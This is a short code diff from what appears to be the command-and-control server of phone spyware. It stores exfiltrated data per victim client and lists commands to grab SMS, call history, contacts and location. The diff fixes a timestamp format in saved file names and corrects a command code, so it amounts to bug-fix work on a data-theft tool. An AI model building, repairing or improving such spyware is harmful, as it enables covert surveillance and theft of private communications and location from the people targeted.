@@ -99,7 +99,7 @@ def save_to_disk(client_id, label, data):
     path = os.path.join(EXFIL_DATA_PATH, client_id, label)
     os.makedirs(path, exist_ok=True)
     file_name = os.path.join(
-        path, datetime.now().strftime("%d-%m-%Y_%H:%M:%S"))
+        path, datetime.now().strftime("%d-%m-%Y_%H-%M-%S"))
 
     with open(file_name, "wb") as f:
         f.write(data)
@@ -155,7 +155,7 @@ sidebar_commands = [
     Command(0x7, "Get SMS", sms_callback),
     Command(0x8, "Get Call History", call_history_callback),
     Command(0x9, "Get Contacts", contact_callback),
-    Command(0x10, "Get Location", location_callback)
+    Command(0xA, "Get Location", location_callback)
 ]
 
 sidebar_commands = {
